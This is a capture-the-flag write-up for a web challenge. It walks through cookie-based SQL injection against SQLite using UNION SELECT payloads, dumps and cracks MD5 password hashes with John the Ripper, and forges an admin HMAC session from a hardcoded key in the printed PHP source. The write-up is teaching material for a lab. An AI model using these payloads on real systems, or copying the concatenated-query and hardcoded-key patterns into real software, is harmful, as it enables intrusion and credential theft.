## Web 2 - SQLi then HMAC
#### Description
Vanilla SQL Injection without protection, and then abuse an insufficient cryptography issue.  
  
__Flag Format__ : WTCTT2023_WEB02{[a-z0-9]{32}}  
__URL__ : [http://web.wtctt2023.p7z.pw:8002/](http://web.wtctt2023.p7z.pw:8002/)  
  
Hint 1: Directory Fuzzing is NOT required (no hidden files / web pages).  
Hint 2: Online password brute forcing (dictionary attack) is NOT required.  
Hint 3: The challenge is designed to be exploited manually without automated security scanners.
#### Solution

Open dev tool and I found some hint. it told about this challenge must sql injection on cookie and before : 

![1.png](./assets/web2/1.png)

Let's try by go to login page and follow by login step but open interception on Burp Suite and send HTTP Request to request for craft the payload.

![2.png](./assets/web2/2.png)

use boolean base and the response will show you that something is interesting.

```less
guest' or '1'='1%3Ainvalid
```

![3.png](./assets/web2/3.png)

Follow by step if we can injection, I will find about number of columns in table for make union payload with order by statement. try to increase number to get error if you get error bring the current number - 1 and you will get number of columns in table.

```less
guest' ORDER BY 1--%3Ainvalid
```

![4.png](./assets/web2/4.png)

After I know about number of column I will find the name of table by this command.

```sql
guest' UNION SELECT column_name, NULL FROM information_schema.columns--%3Ainvalid
```

![5.png](./assets/web2/5.png)

but response told you ___"no such table: information_schema.columns"___ that make me sure. the dbms is SQLite.  [Payload](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md)

```sql
guest' UNION SELECT 1,sql,2 FROM sqlite_schema--%3Ainvalid
```

I entered sql between 1 and 2 because, based on my testing, I discovered that putting a value in this position there would result in a response.

![6.png](./assets/web2/6.png)

get username

```sql
guest' UNION SELECT 1,username,2 FROM members--%3Ainvalid
```

get password

```sql
guest' UNION SELECT 1,password,2 FROM members--%3Ainvalid
```

Ohhhhh, password was encrypted by MD5 but don't worry I will crack it with john the ripper. run command and you will get the password of testuser use it to login.

```less
john --wordlist={PathOfRockYou} --format=raw-md5 cipher
```

After login, you will meet some highlight of code.

```php
<?php
    
    # init db
    $databaseFile = 'database.sqlite';

    if (!file_exists($databaseFile)) {
        try {
            // Create (connect to) a read-only connection to SQLite database in file
            $database = new PDO('sqlite:' . $databaseFile );
            
            // Set errormode to exceptions
            $database->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

            // Create the 'members' table
            $createQuery = "CREATE TABLE IF NOT EXISTS members (
                                user_id INTEGER PRIMARY KEY,
                                username TEXT NOT NULL,
                                password TEXT NOT NULL
                            )";
            $database->exec($createQuery);

            $insertQuery = "INSERT INTO members (username, password) VALUES (?, ?)";
            $statement = $database->prepare($insertQuery);

            $passwords = [
                'whatever', 
                getenv('ADMIN_PASSWORD')
                ];
            
            
            $statement->execute(['testuser', md5($passwords[0])]);
            $statement->execute(['unguessable_admin', md5($passwords[1])]);
            
            $database = null;
        } catch (PDOException $e) {
            
            setcookie('error', $e->getMessage(), 0, '/'); // Set cookie
            
        }
    } 

    // read-only
    $database = new PDO('sqlite:' . $databaseFile, null, null, [PDO::SQLITE_ATTR_OPEN_FLAGS => PDO::SQLITE_OPEN_READONLY]);
    $database->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

    $secretKey =  base64_decode('ZjcwODRiOGM0MDMzNTI5MWQxMWYwMTEzY2RmNDhlNmM='); 


    // Function to create a HMAC signature
    function createHmacSignature($username) {
        global $secretKey;
        return hash_hmac('sha256', $username, $secretKey);
    }

    if(!isset($_COOKIE['app_session'])){
        $cookieValue = 'guest' . ':invalid' ;
        setcookie('app_session', $cookieValue, 0, '/'); // Set cookie
    }

    // Function to validate the session
    function isSessionValid() {
        global $database;
        global $secretKey;
        if (isset($_COOKIE['app_session'])) {
            list($username, $cookieHmac) = explode(':', $_COOKIE['app_session']);
            // Prepare a statement for getting user data
            try {
                // Check if user exists in the database
                $sql = "SELECT * FROM members WHERE username = '".$username."'";
                
                $stmt = $database->prepare($sql);
                $stmt->execute();
                $user = $stmt->fetch(PDO::FETCH_ASSOC);

                if($user !== false){
                     $calculatedHmac = createHmacSignature($username, $secretKey);
                     // Check if the HMAC is valid
                     if (hash_equals($calculatedHmac, $cookieHmac)) {
                        return true;
                     }
                     echo '<!-- Debug1: '.$user['username'].' -->';
                }
                
                return false;

            } catch (PDOException $e) {
                // Handle the database error, e.g., log it or echo an error message
                echo '<!-- Debug2: '.$e->getMessage().' -->';
                return false; // Return false in case of a database error
            }
            
        }
        return false;
    }


    // Login Function
    function login($username, $password) {
        // Prepare a statement for getting user data
        global $database;
        global $secretKey;
        $stmt = $database->prepare("SELECT * FROM members WHERE username = ?");
        $stmt->execute([$username]);
        $user = $stmt->fetch(PDO::FETCH_ASSOC);

        if ($user && md5($password) === $user['password']) {
            // Correct credentials, create HMAC signature
            $hmac = createHmacSignature($username, $secretKey);
            $cookieValue = $username . ':' . $hmac;
            setcookie('app_session', $cookieValue, 0, '/'); // Set cookie
            header("Location: /index.php");
            exit();
        }
        setcookie('error', 'Username or Password is not correct.', 0, '/'); // Set cookie
        
        header("Location: /login.php?error=cred_invalid");
        exit();
    }

    // Logout Function
    function logout() {
        if (isset($_COOKIE['app_session'])) {
            // Expire the cookie by setting its expiration time in the past
            setcookie('app_session', '', time() - 3600, '/');
            unset($_COOKIE['app_session']);
        } 
        header("Location: /index.php");
        exit();
    }


?>
```

If you read it you will find something that vulnerable, it has secret key on code (HardCode!!) and I cut some code that make me to get flag.

```php
<?php
$secretKey =  base64_decode('ZjcwODRiOGM0MDMzNTI5MWQxMWYwMTEzY2RmNDhlNmM='); 


// Function to create a HMAC signature
function createHmacSignature($username) {
    global $secretKey;
    return hash_hmac('sha256', $username, $secretKey);
}
echo createHmacSignature("unguessable_admin")
?>
```

![7.png](./assets/web2/7.png)

Edit session on cookie by your skill.

![8.png](./assets/web2/8.png)

Yummy, got FLAG2. XD!!!